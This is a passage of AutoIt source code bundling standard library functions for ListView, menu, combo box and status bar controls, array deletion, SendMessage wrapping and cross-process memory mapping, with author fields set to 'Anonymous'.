EndFunc   ;==>_GUICtrlListView_GetExtendedListViewStyle

; #FUNCTION# ====================================================================================================================
; Name...........: _GUICtrlListView_GetHeader
; Description ...: Retrieves the handle to the header control
; Syntax.........: _GUICtrlListView_GetHeader($hWnd)
; Parameters ....: $hWnd        - Handle to the control
; Return values .: Success      - The handle to the header control
; Author ........: Anonymous
; Modified.......:
; Remarks .......:
; Related .......:
; Link ..........:
; Example .......: Yes
; ===============================================================================================================================
Func _GUICtrlListView_GetHeader($hwnd)
	If $Debug_LV Then __UDF_ValidateClassName($hwnd, "SysListView32") ; $__LISTVIEWCONSTANT_ClassName = "SysListView32"

	If IsHWnd($hwnd) Then
		Return _SendMessage($hwnd, 0x1000 + 31) ; $LVM_GETHEADER = ($LVM_FIRST + 31)
	Else
		Return GUICtrlSendMsg($hwnd, 0x1000 + 31, 0, 0) ; LVM_GETHEADER = ($LVM_FIRST + 31)
	EndIf
EndFunc   ;==>_GUICtrlListView_GetHeader

; #FUNCTION# ====================================================================================================================
; Name...........: _GUICtrlListView_GetUnicodeFormat
; Description ...: Retrieves the UNICODE character format flag
; Syntax.........: _GUICtrlListView_GetUnicodeFormat($hWnd)
; Parameters ....: $hWnd        - Handle to the control
; Return values .: True         - Using Unicode characters
;                  False        - Using ANSI characters
; Author ........: Anonymous
; Modified.......:
; Remarks .......:
; Related .......: _GUICtrlListView_SetUnicodeFormat
; Link ..........:
; Example .......: Yes
; ===============================================================================================================================
Func _GUICtrlListView_GetUnicodeFormat($hwnd)
	If $Debug_LV Then __UDF_ValidateClassName($hwnd, "SysListView32") ; $__LISTVIEWCONSTANT_ClassName = "SysListView32"

	If IsHWnd($hwnd) Then
		Return _SendMessage($hwnd, 0x2000 + 6) <> 0 ;  $LVM_GETUNICODEFORMAT = 0x2000 + 6
	Else
		Return GUICtrlSendMsg($hwnd, 0x2000 + 6, 0, 0) <> 0 ;  $LVM_GETUNICODEFORMAT = 0x2000 + 6
	EndIf
EndFunc   ;==>_GUICtrlListView_GetUnicodeFormat

; #FUNCTION# ====================================================================================================================
; Name...........: _GUICtrlListView_GetItemEx
; Description ...: Retrieves some or all of an item's attributes
; Syntax.........: _GUICtrlListView_GetItemEx($hWnd, ByRef $tItem)
; Parameters ....: $hWnd        - Handle to the control
;                  $tItem       - $tagLVITEM structure that specifies the information to retrieve
; Return values .: Success      - True
;                  Failure      - False
; Author ........: Anonymous
; Modified.......: Anonymous
; Remarks .......:
; Related .......: _GUICtrlListView_GetItem, $tagLVITEM
; Link ..........:
; Example .......: Yes
; ===============================================================================================================================
Func _GUICtrlListView_GetItemEx($hwnd, ByRef $tItem)
	If $Debug_LV Then __UDF_ValidateClassName($hwnd, "SysListView32") ; $__LISTVIEWCONSTANT_ClassName = "SysListView32"

	Local $fUnicode = _GUICtrlListView_GetUnicodeFormat($hwnd)

	Local $pItem = DllStructGetPtr($tItem)
	Local $iRet
	If IsHWnd($hwnd) Then
		If _WinAPI_InProcess($hwnd, $_lv_ghLastWnd) Then
			$iRet = _SendMessage($hwnd, 0x1000 + 75, 0, $pItem, 0, "wparam", "ptr") ; $LVM_GETITEMW = ($LVM_FIRST + 75)
		Else
			Local $iItem = DllStructGetSize($tItem)
			Local $tMemMap
			Local $pMemory = _MemInit($hwnd, $iItem, $tMemMap)
			_MemWrite($tMemMap, $pItem)
			If $fUnicode Then
				_SendMessage($hwnd, 0x1000 + 75, 0, $pMemory, 0, "wparam", "ptr") ; $LVM_GETITEMW = ($LVM_FIRST + 75)
			Else
				_SendMessage($hwnd, 0x1000 + 5, 0, $pMemory, 0, "wparam", "ptr") ; $LVM_GETITEMA = ($LVM_FIRST + 5)
			EndIf
			_MemRead($tMemMap, $pMemory, $pItem, $iItem)
			_MemFree($tMemMap)
		EndIf
	Else
		If $fUnicode Then
			$iRet = GUICtrlSendMsg($hwnd, 0x1000 + 75, 0, $pItem) ; $LVM_GETITEMW = ($LVM_FIRST + 75)
		Else
			$iRet = GUICtrlSendMsg($hwnd, 0x1000 + 5, 0, $pItem) ; $LVM_GETITEMA = ($LVM_FIRST + 5)
		EndIf
	EndIf
	Return $iRet <> 0
EndFunc   ;==>_GUICtrlListView_GetItemEx

; #FUNCTION# ====================================================================================================================
; Name...........: _GUICtrlListView_GetItemParam
; Description ...: Retrieves the application specific value of the item
; Syntax.........: _GUICtrlListView_GetItemParam($hWnd, $iIndex)
; Parameters ....: $hWnd        - Handle to the control
;                  $iIndex      - Zero based item index
; Return values .: Success      - Application specific value
; Author ........: Anonymous
; Modified.......:
; Remarks .......:
; Related .......: _GUICtrlListView_SetItemParam
; Link ..........:
; Example .......: Yes
; ===============================================================================================================================
Func _GUICtrlListView_GetItemParam($hwnd, $iIndex)
	Local $tItem = DllStructCreate($tagLVITEM)
	DllStructSetData($tItem, "Mask", 0x00000004) ; $LVIF_PARAM = 0x00000004
	DllStructSetData($tItem, "Item", $iIndex)
	_GUICtrlListView_GetItemEx($hwnd, $tItem)
	Return DllStructGetData($tItem, "Param")
EndFunc   ;==>_GUICtrlListView_GetItemParam

; #FUNCTION# ====================================================================================================================
; Name...........: _GUICtrlMenu_TrackPopupMenu
; Description ...: Displays a shortcut menu at the specified location
; Syntax.........: _GUICtrlMenu_TrackPopupMenu($hMenu, $hWnd[, $iX = -1[, $iY = -1[, $iAlignX = 1[, $iAlignY = 1[, $iNotify = 0[, $iButtons = 0]]]]]])
; Parameters ....: $hMenu       - Handle to the shortcut menu to be displayed
;                  $hWnd        - Handle to the window that owns the shortcut menu
;                  $iX          - Specifies the horizontal location of the shortcut menu, in screen coordinates.  If this is  -1,
;                  +the current mouse position is used.
;                  $iY          - Specifies the vertical location of the shortcut menu, in screen coordinates. If this is -1, the
;                  +current mouse position is used.
;                  $iAlignX     - Specifies how to position the menu horizontally:
;                  |0 - Center the menu horizontally relative to $iX
;                  |1 - Position the menu so that its left side is aligned with $iX
;                  |2 - Position the menu so that its right side is aligned with $iX
;                  $iAlignY     - Specifies how to position the menu vertically:
;                  |0 - Position the menu so that its bottom side is aligned with $iY
;                  |1 - Position the menu so that its top side is aligned with $iY
;                  |2 - Center the menu vertically relative to $iY
;                  $iNotify     - Use to determine the selection withouta parent window:
;                  |1 - Do not send notification messages
;                  |2 - Return the menu item identifier of the user's selection
;                  $iButtons    - Mouse button the shortcut menu tracks:
;                  |0 - The user can select items with only the left mouse button
;                  |1 - The user can select items with both left and right buttons
; Return values .: Success      - If $iNotify is set to 2, the return value is the menu item identifier  of  the  item  that  the
;                  +user selected. If the user cancels the menu without making a selection or if an error occurs, then the return
;                  +value is zero. If $iNotify is not set to 2, the return value is 1.
;                  Failure      - 0
; Author ........: Anonymous
; Modified.......:
; Remarks .......:
; Related .......:
; Link ..........: @@MsdnLink@@ TrackPopupMenu
; Example .......: Yes
; ===============================================================================================================================
Func _GUICtrlMenu_TrackPopupMenu($hMenu, $hwnd, $iX = -1, $iY = -1, $iAlignX = 1, $iAlignY = 1, $iNotify = 0, $iButtons = 0)
	If $iX = -1 Then $iX = _WinAPI_GetMousePosX()
	If $iY = -1 Then $iY = _WinAPI_GetMousePosY()

	Local $iFlags = 0
	Switch $iAlignX
		Case 1
			$iFlags = BitOR($iFlags, 0x0) ; $TPM_LEFTALIGN = 0x0
		Case 2
			$iFlags = BitOR($iFlags, 0x00000008) ; $TPM_RIGHTALIGN = 0x00000008
		Case Else
			$iFlags = BitOR($iFlags, 0x00000004) ; $TPM_CENTERALIGN = 0x00000004
	EndSwitch
	Switch $iAlignY
		Case 1
			$iFlags = BitOR($iFlags, 0x0) ; $TPM_TOPALIGN = 0x0
		Case 2
			$iFlags = BitOR($iFlags, 0x00000010) ; $TPM_VCENTERALIGN = 0x00000010
		Case Else
			$iFlags = BitOR($iFlags, 0x00000020) ; $TPM_BOTTOMALIGN	= 0x00000020
	EndSwitch
	If BitAND($iNotify, 1) <> 0 Then $iFlags = BitOR($iFlags, 0x00000080) ; $TPM_NONOTIFY = 0x00000080
	If BitAND($iNotify, 2) <> 0 Then $iFlags = BitOR($iFlags, 0x00000100) ; $TPM_RETURNCMD = 0x00000100
	Switch $iButtons
		Case 1
			$iFlags = BitOR($iFlags, 0x00000002) ; $TPM_RIGHTBUTTON	= 0x00000002
		Case Else
			$iFlags = BitOR($iFlags, 0x0) ; $TPM_LEFTBUTTON = 0x0
	EndSwitch
	Local $aResult = DllCall("User32.dll", "bool", "TrackPopupMenu", "handle", $hMenu, "uint", $iFlags, "int", $iX, "int", $iY, "int", 0, "hwnd", $hwnd, "ptr", 0)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aResult[0]
EndFunc   ;==>_GUICtrlMenu_TrackPopupMenu

; #FUNCTION# ====================================================================================================================
; Name...........: _GUICtrlComboBox_FindString
; Description ...: Search for a string
; Syntax.........: _GUICtrlComboBox_FindString($hWnd, $sText[, $iIndex = -1])
; Parameters ....: $hWnd        - Handle to control
;                  $sText       - String to search for
;                  $iIndex      - Zero based index of the item preceding the first item to be searched
; Return values .: Success      - Zero based index of the matching item
;                  Failure      - -1
; Author ........: Anonymous
; Modified.......:
; Remarks .......: Finds the first string beginning with the characters specified in $sText
;+
;                  When the search reaches the bottom of the ListBox, it continues from the top of the
;                  ListBox back to the item specified by $iIndex.
;+
;                  If $iIndex is v1, the entire ListBox is searched from the beginning.
; Related .......: _GUICtrlComboBox_SelectString
; Link ..........:
; Example .......: Yes
; ===============================================================================================================================
Func _GUICtrlComboBox_FindString($hwnd, $sText, $iIndex = -1)
	If $Debug_CB Then __UDF_ValidateClassName($hwnd, "ComboBox") ; $__COMBOBOXCONSTANT_ClassName = "ComboBox"
	If Not IsHWnd($hwnd) Then $hwnd = GUICtrlGetHandle($hwnd)

	Return _SendMessage($hwnd, 0x14C, $iIndex, $sText, 0, "int", "wstr") ; $CB_FINDSTRING = 0x14C
EndFunc   ;==>_GUICtrlComboBox_FindString

; #FUNCTION# ====================================================================================================================
; Name...........: _GUICtrlComboBox_AddString
; Description ...: Add a string
; Syntax.........: _GUICtrlComboBox_AddString($hWnd, $sText)
; Parameters ....: $hWnd        - Handle to control
;                  $sText       - String to add
; Return values .: Success      - The index of the new item
;                  Failure      - -1
; Author ........: Anonymous
; Modified.......:
; Remarks .......:
; Related .......: _GUICtrlComboBox_DeleteString, _GUICtrlComboBox_InsertString, _GUICtrlComboBox_ResetContent, _GUICtrlComboBox_InitStorage
; Link ..........:
; Example .......: Yes
; ===============================================================================================================================
Func _GUICtrlComboBox_AddString($hwnd, $sText)
	If $Debug_CB Then __UDF_ValidateClassName($hwnd, "ComboBox") ; $__COMBOBOXCONSTANT_ClassName = "ComboBox"
	If Not IsHWnd($hwnd) Then $hwnd = GUICtrlGetHandle($hwnd)

	Return _SendMessage($hwnd, 0x143, 0, $sText, 0, "wparam", "wstr") ; $CB_ADDSTRING = 0x143
EndFunc   ;==>_GUICtrlComboBox_AddString

; #FUNCTION# ====================================================================================================================
; Name...........: _GUICtrlComboBox_SetCurSel
; Description ...: Select a string in the list of a ComboBox
; Syntax.........: _GUICtrlComboBox_SetCurSel($hWnd[, $iIndex = -1])
; Parameters ....: $hWnd        - Handle to control
;                  $iIndex      - Specifies the zero-based index of the string to select
; Return values .: Success      - The index of the item selected
;                  Failure      - -1
; Author ........: Anonymous
; Modified.......:
; Remarks .......: If $iIndex is v1, any current selection in the list is removed and the edit control is cleared.
;+
;                  If $iIndex is greater than the number of items in the list or if $iIndex is v1, the return value
;                  is -1 and the selection is cleared.
; Related .......: _GUICtrlComboBox_GetCurSel
; Link ..........:
; Example .......: Yes
; ===============================================================================================================================
Func _GUICtrlComboBox_SetCurSel($hwnd, $iIndex = -1)
	If $Debug_CB Then __UDF_ValidateClassName($hwnd, "ComboBox") ; $__COMBOBOXCONSTANT_ClassName = "ComboBox"
	If Not IsHWnd($hwnd) Then $hwnd = GUICtrlGetHandle($hwnd)

	Return _SendMessage($hwnd, 0x14E, $iIndex) ;  $CB_SETCURSEL = 0x14E
EndFunc   ;==>_GUICtrlComboBox_SetCurSel
; #FUNCTION# ====================================================================================================================
; Name...........: _ArrayDelete
; Description ...: Deletes the specified element from the given array.
; Syntax.........: _ArrayDelete(ByRef $avArray, $iElement)
; Parameters ....: $avArray  - Array to modify
;                  $iElement - Element to delete
; Return values .: Success - New size of the array
;                  Failure - 0, sets @error to:
;                  |1 - $avArray is not an array
;                  |3 - $avArray has too many dimensions (only up to 2D supported)
;                  |(2 - Deprecated error code)
; Author ........: Anonymous
; Modified.......: Anonymous - array passed ByRef, Anonymous - 2D arrays supported, reworked function (no longer needs temporary array; faster when deleting from end)
; Remarks .......: If the array has one element left (or one row for 2D arrays), it will be set to "" after _ArrayDelete() is used on it.
;+
;                  If the $ilement is greater than the array size then the last element is destroyed.
; Related .......: _ArrayAdd, _ArrayInsert, _ArrayPop, _ArrayPush
; Link ..........:
; Example .......: Yes
; ===============================================================================================================================
Func _ArrayDelete(ByRef $avArray, $iElement)
	If Not IsArray($avArray) Then Return SetError(1, 0, 0)

	Local $iUBound = UBound($avArray, 1) - 1

	If Not $iUBound Then
		$avArray = ""
		Return 0
	EndIf

	; Bounds checking
	If $iElement < 0 Then $iElement = 0
	If $iElement > $iUBound Then $iElement = $iUBound

	; Move items after $iElement up by 1
	Switch UBound($avArray, 0)
		Case 1
			For $i = $iElement To $iUBound - 1
				$avArray[$i] = $avArray[$i + 1]
			Next
			ReDim $avArray[$iUBound]
		Case 2
			Local $iSubMax = UBound($avArray, 2) - 1
			For $i = $iElement To $iUBound - 1
				For $j = 0 To $iSubMax
					$avArray[$i][$j] = $avArray[$i + 1][$j]
				Next
			Next
			ReDim $avArray[$iUBound][$iSubMax + 1]
		Case Else
			Return SetError(3, 0, 0)
	EndSwitch

	Return $iUBound
EndFunc   ;==>_ArrayDelete

; #FUNCTION# ====================================================================================================================
; Name...........: _SendMessage
; Description ...: Wrapper for commonly used Dll Call
; Syntax.........: _SendMessage($hWnd, $iMsg[, $wParam = 0[, $lParam = 0[, $iReturn = 0[, $wParamType = "wparam"[, $lParamType = "lparam"[, $sReturnType = "lresult"]]]]]])
; Parameters ....: $hWnd       - Window/control handle
;                  $iMsg       - Message to send to control (number)
;                  $wParam     - Specifies additional message-specific information
;                  $lParam     - Specifies additional message-specific information
;                  $iReturn    - What to return:
;                  |0 - Return value from dll call
;                  |1 - $ihWnd
;                  |2 - $iMsg
;                  |3 - $wParam
;                  |4 - $lParam
;                  |<0 or > 4 - array same as dllcall
;                  $wParamType - See DllCall in Related
;                  $lParamType - See DllCall in Related
;                  $sReturnType - See DllCall in Related
; Return values .: Success      - User selected value from the DllCall() result
;                  Failure      - @error is set
; Author ........: Anonymous
; Modified.......: Anonymous
; Remarks .......:
; Related .......: _SendMessage, DllCall
; Link ..........:
; Example .......: Yes
; ===============================================================================================================================
Func _SendMessage($hwnd, $iMsg, $wParam = 0, $lParam = 0, $iReturn = 0, $wParamType = "wparam", $lParamType = "lparam", $sReturnType = "lresult")
	Local $aResult = DllCall("user32.dll", $sReturnType, "SendMessageW", "hwnd", $hwnd, "uint", $iMsg, $wParamType, $wParam, $lParamType, $lParam)
	If @error Then Return SetError(@error, @extended, "")
	If $iReturn >= 0 And $iReturn <= 4 Then Return $aResult[$iReturn]
	Return $aResult
EndFunc   ;==>_SendMessage

; #FUNCTION# ====================================================================================================================
; Name...........: _GUICtrlStatusBar_Create
; Description ...: Create a statusbar
; Syntax.........: _GUICtrlStatusBar_Create($hWnd[, $vPartEdge = -1[, $vPartText = ""[, $iStyles = -1[, $iExStyles = 0x00000000]]]])
; Parameters ....: $hWnd        - Handle to parent window
;                  $vPartEdge  - Width of part or parts, for more than 1 part pass in zero based array in the following format:
;                  |$vPartEdge[0] - Right edge of part #1
;                  |$vPartEdge[1] - Right edge of part #2
;                  |$vPartEdge[n] - Right edeg of part n
;                  $vPartText   - Text of part or parts, for more than 1 part pass in zero based array in the following format:
;                  |$vPartText[0] - First part
;                  |$vPartText[1] - Second part
;                  |$vPartText[n] - Last part
;                  $iStyles     - Control styles:
;                  |$SBARS_SIZEGRIP - The status bar control will include a sizing grip at the right end of the status bar
;                  |$SBARS_TOOLTIPS - The status bar will have tooltips
;                  -
;                  |Forced: $WS_CHILD, $WS_VISIBLE
;                  $iExStyles   - Control extended style
; Return values .: Success      - Handle to the control
;                  Failure      - 0
; Author ........: Anonymous
; Modified.......: Anonymous
; Remarks .......: If using GUICtrlCreateMenu then use _GUICtrlStatusBar_Create after GUICtrlCreateMenu
; Related .......: _GUICtrlStatusBar_Destroy
; Link ..........:
; Example .......: Yes
; ===============================================================================================================================
Func _GUICtrlStatusBar_Create($hwnd, $vPartEdge = -1, $vPartText = "", $iStyles = -1, $iExStyles = -1)
	If Not IsHWnd($hwnd) Then Return SetError(1, 0, 0) ; Invalid Window handle for _GUICtrlStatusBar_Create 1st parameter

	Local $iStyle = BitOR(0x40000000, 0x10000000) ; $__UDFGUICONSTANT_WS_CHILD = 0x40000000 $__UDFGUICONSTANT_WS_VISIBLE = 0x10000000

	If $iStyles = -1 Then $iStyles = 0x00000000
	If $iExStyles = -1 Then $iExStyles = 0x00000000

	Local $aPartWidth[1], $aPartText[1]
	If @NumParams > 1 Then ; more than param passed in
		; setting up arrays
		If IsArray($vPartEdge) Then ; setup part width array
			$aPartWidth = $vPartEdge
		Else
			$aPartWidth[0] = $vPartEdge
		EndIf
		If @NumParams = 2 Then ; part text was not passed in so set array to same size as part width array
			ReDim $aPartText[UBound($aPartWidth)]
		Else
			If IsArray($vPartText) Then ; setup part text array
				$aPartText = $vPartText
			Else
				$aPartText[0] = $vPartText
			EndIf
			; if partwidth array is not same size as parttext array use larger sized array for size
			If UBound($aPartWidth) <> UBound($aPartText) Then
				Local $iLast
				If UBound($aPartWidth) > UBound($aPartText) Then ; width array is larger
					$iLast = UBound($aPartText)
					ReDim $aPartText[UBound($aPartWidth)]
					For $x = $iLast To UBound($aPartText) - 1
						$aPartWidth[$x] = ""
					Next
				Else ; text array is larger
					$iLast = UBound($aPartWidth)
					ReDim $aPartWidth[UBound($aPartText)]
					For $x = $iLast To UBound($aPartWidth) - 1
						$aPartWidth[$x] = $aPartWidth[$x - 1] + 75
					Next
					$aPartWidth[UBound($aPartText) - 1] = -1
				EndIf
			EndIf
		EndIf
		If Not IsHWnd($hwnd) Then $hwnd = HWnd($hwnd)
		If @NumParams > 3 Then $iStyle = BitOR($iStyle, $iStyles)
	EndIf

	Local $nCtrlID = __UDF_GetNextGlobalID($hwnd)
	If @error Then Return SetError(@error, @extended, 0)

	Local $hWndSBar = _WinAPI_CreateWindowEx($iExStyles, "msctls_statusbar32", "", $iStyle, 0, 0, 0, 0, $hwnd, $nCtrlID) ; $__STATUSBARCONSTANT_ClassName = "msctls_statusbar32"
	If @error Then Return SetError(@error, @extended, 0)

	If @NumParams > 1 Then ; set the parts/text
		_GUICtrlStatusBar_SetParts($hWndSBar, UBound($aPartWidth), $aPartWidth)
		For $x = 0 To UBound($aPartText) - 1
			_GUICtrlStatusBar_SetText($hWndSBar, $aPartText[$x], $x)
		Next
	EndIf
	Return $hWndSBar
EndFunc   ;==>_GUICtrlStatusBar_Create

; #FUNCTION# ====================================================================================================================
; Name...........: _GUICtrlStatusBar_SetParts
; Description ...: Sets the number of parts and the part edges
; Syntax.........: _GUICtrlStatusBar_SetParts($hWnd[, $iaParts = -1[, $iaPartWidth = 25]])
; Parameters ....: $hWnd        - Handle to the control
;                  $iaParts     - Number of parts, can be an zero based array of ints in the following format:
;                  |$iaParts[0] - Right edge of part #1
;                  |$iaParts[1] - Right edge of part #2
;                  |$iaParts[n] - Right edge of part n
;                  $iaPartWidth - Size of parts, can be an zero based array of ints in the following format:
;                  |$iaPartWidth[0] - width part #1
;                  |$iaPartWidth[1] - width of part #2
;                  |$iaPartWidth[n] - width of part n
; Return values .: Success      - True
;                  Failure      - False
; Author ........: Anonymous
; Modified.......:
; Remarks .......: If an element is -1, the right edge of the corresponding part extends to the border of the window.
; Related .......: _GUICtrlStatusBar_GetParts
; Link ..........:
; Example .......: Yes
; ===============================================================================================================================
Func _GUICtrlStatusBar_SetParts($hwnd, $iaParts = -1, $iaPartWidth = 25)
	If $Debug_SB Then __UDF_ValidateClassName($hwnd, "msctls_statusbar32") ; $__STATUSBARCONSTANT_ClassName = "msctls_statusbar32"

	;== start sizing parts
	Local $tParts, $iParts = 1
	If IsArray($iaParts) <> 0 Then ; adding array of parts (contains widths)
		$iaParts[UBound($iaParts) - 1] = -1
		$iParts = UBound($iaParts)
		$tParts = DllStructCreate("int[" & $iParts & "]")
		For $x = 0 To $iParts - 2
			DllStructSetData($tParts, 1, $iaParts[$x], $x + 1)
		Next
		DllStructSetData($tParts, 1, -1, $iParts)
	ElseIf IsArray($iaPartWidth) <> 0 Then ; adding array of part widths (make parts an array)
		$iParts = UBound($iaPartWidth)
		$tParts = DllStructCreate("int[" & $iParts & "]")
		For $x = 0 To $iParts - 2
			DllStructSetData($tParts, 1, $iaPartWidth[$x], $x + 1)
		Next
		DllStructSetData($tParts, 1, -1, $iParts)
	ElseIf $iaParts > 1 Then ; adding parts with default width
		$iParts = $iaParts
		$tParts = DllStructCreate("int[" & $iParts & "]")
		For $x = 1 To $iParts - 1
			DllStructSetData($tParts, 1, $iaPartWidth * $x, $x)
		Next
		DllStructSetData($tParts, 1, -1, $iParts)
	Else ; defaulting to 1 part
		$tParts = DllStructCreate("int")
		DllStructSetData($tParts, $iParts, -1)
	EndIf
	;== end set sizing
	Local $pParts = DllStructGetPtr($tParts)
	If _WinAPI_InProcess($hwnd, $__ghSBLastWnd) Then
		_SendMessage($hwnd, 0x400 + 4, $iParts, $pParts, 0, "wparam", "ptr") ; $SB_SETPARTS = ($__STATUSBARCONSTANT_WM_USER + 4)
	Else
		Local $iSize = DllStructGetSize($tParts)
		Local $tMemMap
		Local $pMemory = _MemInit($hwnd, $iSize, $tMemMap)
		_MemWrite($tMemMap, $pParts)
		_SendMessage($hwnd, 0x400 + 4, $iParts, $pMemory, 0, "wparam", "ptr") ; $SB_SETPARTS = ($__STATUSBARCONSTANT_WM_USER + 4)
		_MemFree($tMemMap)
	EndIf
	_GUICtrlStatusBar_Resize($hwnd)
	Return True
EndFunc   ;==>_GUICtrlStatusBar_SetParts

; #FUNCTION# ====================================================================================================================
; Name...........: _GUICtrlStatusBar_SetText
; Description ...: Sets the text in the specified part of a status window
; Syntax.........: _GUICtrlStatusBar_SetText($hWnd, $sText = "", $iPart = 0, $iUFlag = 0)
; Parameters ....: $hWnd        - Handle to the control
;                  $sText       - The text to display in the part
;                  $iPart       - The part to hold the text
;                  $iUFlag      - Type of drawing operation. The type can be one of the following values:
;                  |0               - The text is drawn with a border to appear lower than the plane of the window
;                  |$SBT_NOBORDERS  - The text is drawn without borders
;                  |$SBT_OWNERDRAW  - The text is drawn by the parent window
;                  |$SBT_POPOUT     - The text is drawn with a border to appear higher than the plane of the window
;                  |$SBT_RTLREADING - The text will be displayed in the opposite direction to the text in the parent window
; Return values .: Success      - True
;                  Failure      - False
; Author ........: Anonymous
; Modified.......: Anonymous re-written also added $iUFlag
; Remarks .......: Set $iPart to $SB_SIMPLEID for simple statusbar
; Related .......: _GUICtrlStatusBar_GetText
; Link ..........:
; Example .......: Yes
; ===============================================================================================================================
Func _GUICtrlStatusBar_SetText($hwnd, $sText = "", $iPart = 0, $iUFlag = 0)
	If $Debug_SB Then __UDF_ValidateClassName($hwnd, "msctls_statusbar32") ; $__STATUSBARCONSTANT_ClassName = "msctls_statusbar32"

	Local $fUnicode = _GUICtrlStatusBar_GetUnicodeFormat($hwnd)

	Local $iBuffer = StringLen($sText) + 1
	Local $tText
	If $fUnicode Then
		$tText = DllStructCreate("wchar Text[" & $iBuffer & "]")
		$iBuffer *= 2
	Else
		$tText = DllStructCreate("char Text[" & $iBuffer & "]")
	EndIf
	Local $pBuffer = DllStructGetPtr($tText)
	DllStructSetData($tText, "Text", $sText)
	If _GUICtrlStatusBar_IsSimple($hwnd) Then $iPart = 0xff ; $SB_SIMPLEID = 0xff
	Local $iRet
	If _WinAPI_InProcess($hwnd, $__ghSBLastWnd) Then
		$iRet = _SendMessage($hwnd, 0x400 + 11, BitOR($iPart, $iUFlag), $pBuffer, 0, "wparam", "ptr") ; $SB_SETTEXTW = ($__STATUSBARCONSTANT_WM_USER + 11)
	Else
		Local $tMemMap
		Local $pMemory = _MemInit($hwnd, $iBuffer, $tMemMap)
		_MemWrite($tMemMap, $pBuffer)
		If $fUnicode Then
			$iRet = _SendMessage($hwnd, 0x400 + 11, BitOR($iPart, $iUFlag), $pMemory, 0, "wparam", "ptr") ; $SB_SETTEXTW = ($__STATUSBARCONSTANT_WM_USER + 11)
		Else
			$iRet = _SendMessage($hwnd, 0x400 + 1, BitOR($iPart, $iUFlag), $pMemory, 0, "wparam", "ptr") ; $SB_SETTEXTA = ($__STATUSBARCONSTANT_WM_USER + 1) $SB_SETTEXT = $SB_SETTEXTA
		EndIf
		_MemFree($tMemMap)
	EndIf
	Return $iRet <> 0
EndFunc   ;==>_GUICtrlStatusBar_SetText

; #INTERNAL_USE_ONLY# ===========================================================================================================
; Name...........: __UDF_ValidateClassName
; Description ...: Used for debugging when creating examples
; Syntax.........: __UDF_ValidateClassName($hWnd, $sType)
; Parameters ....: $hWnd        - Handle to the control
; Return values .: None
; Author ........: Anonymous
; Modified.......:
; Remarks .......: For Internal Use Only
; Related .......:
; Link ..........:
; Example .......:
; ===============================================================================================================================
Func __UDF_ValidateClassName($hwnd, $sClassNames)
	__UDF_DebugPrint("This is for debugging only, set the debug variable to false before submitting")
	If _WinAPI_IsClassName($hwnd, $sClassNames) Then Return True
	Local $sSeparator = Opt("GUIDataSeparatorChar")
	$sClassNames = StringReplace($sClassNames, $sSeparator, ",")

	__UDF_DebugPrint("Invalid Class Type(s):" & @LF & @TAB & "Expecting Type(s): " & $sClassNames & @LF & @TAB & "Received Type : " & _WinAPI_GetClassName($hwnd))
	Exit
EndFunc   ;==>__UDF_ValidateClassName

; #FUNCTION# ====================================================================================================================
; Name...........: _WinAPI_InProcess
; Description ...: Determines whether a window belongs to the current process
; Syntax.........: _WinAPI_InProcess($hWnd, ByRef $hLastWnd)
; Parameters ....: $hWnd        - Window handle to be tested
;                  $hLastWnd    - Last window tested. If $hWnd = $hLastWnd, this process will immediately return True. Otherwise,
;                  +_WinAPI_InProcess will be called. If $hWnd is in process, $hLastWnd will be set to $hWnd on return.
; Return values .: True         - Window handle belongs to the current process
;                  False        - Window handle does not belong to the current process
; Author ........: Anonymous
; Modified.......:
; Remarks .......: This is one of the key functions to the control memory mapping technique.  It checks the process ID of the
;                  window to determine if it belongs to the current process, which means it can be accessed without mapping the control memory.
; Related .......:
; Link ..........:
; Example .......:
; ===============================================================================================================================
Func _WinAPI_InProcess($hwnd, ByRef $hLastWnd)
	If $hwnd = $hLastWnd Then Return True
	For $iI = $__gaInProcess_WinAPI[0][0] To 1 Step -1
		If $hwnd = $__gaInProcess_WinAPI[$iI][0] Then
			If $__gaInProcess_WinAPI[$iI][1] Then
				$hLastWnd = $hwnd
				Return True
			Else
				Return False
			EndIf
		EndIf
	Next
	Local $iProcessID
	_WinAPI_GetWindowThreadProcessId($hwnd, $iProcessID)
	Local $iCount = $__gaInProcess_WinAPI[0][0] + 1
	If $iCount >= 64 Then $iCount = 1
	$__gaInProcess_WinAPI[0][0] = $iCount
	$__gaInProcess_WinAPI[$iCount][0] = $hwnd
	$__gaInProcess_WinAPI[$iCount][1] = ($iProcessID = @AutoItPID)
	Return $__gaInProcess_WinAPI[$iCount][1]
EndFunc   ;==>_WinAPI_InProcess

; #INTERNAL_USE_ONLY# ===========================================================================================================
; Name...........: _MemInit
; Description ...: Initializes a tagMEMMAP structure for a control
; Syntax.........: _MemInit($hWnd, $iSize, ByRef $tMemMap)
; Parameters ....: $hWnd        - Window handle of the process where memory will be mapped
;                  $iSize       - Size, in bytes, of memory space to map
;                  $tMemMap     - tagMEMMAP structure that will be initialized
; Return values .: Success      - Pointer to reserved memory block
;                  Failure      - 0
; Author ........: Anonymous
; Modified.......:
; Remarks .......: This function is used internally by Auto3Lib and should not normally be called
; Related .......: _MemFree
; Link ..........:
; Example .......:
; ===============================================================================================================================
Func _MemInit($hwnd, $iSize, ByRef $tMemMap)
	Local $aResult = DllCall("User32.dll", "dword", "GetWindowThreadProcessId", "hwnd", $hwnd, "dword*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	Local $iProcessID = $aResult[2]
	If $iProcessID = 0 Then Return SetError(1, 0, 0) ; Invalid window handle

	Local $iAccess = BitOR(0x00000008, 0x00000010, 0x00000020) ; $PROCESS_VM_OPERATION = 0x00000008 $PROCESS_VM_READ = 0x00000010 $PROCESS_VM_WRITE = 0x00000020
	Local $hProcess = __Mem_OpenProcess($iAccess, False, $iProcessID, True)
	Local $iAlloc = BitOR(0x00002000, 0x00001000) ; $MEM_RESERVE = 0x00002000 $MEM_COMMIT = 0x00001000
	Local $pMemory = _MemVirtualAllocEx($hProcess, 0, $iSize, $iAlloc, 0x00000004) ; $PAGE_READWRITE = 0x00000004

	If $pMemory = 0 Then Return SetError(2, 0, 0) ; Unable to allocate memory

	$tMemMap = DllStructCreate($tagMEMMAP)
	DllStructSetData($tMemMap, "hProc", $hProcess)
	DllStructSetData($tMemMap, "Size", $iSize)
	DllStructSetData($tMemMap, "Mem", $pMemory)
	Return $pMemory
EndFunc   ;==>_MemInit

; #INTERNAL_USE_ONLY# ===========================================================================================================
; Name...........: _MemWrite
; Description ...: Transfer memory to external address space from internal address space
; Syntax.........: _MemWrite(ByRef $tMemMap, $pSrce[, $pDest = 0[, $iSize = 0[, $sSrce = "ptr"]]])
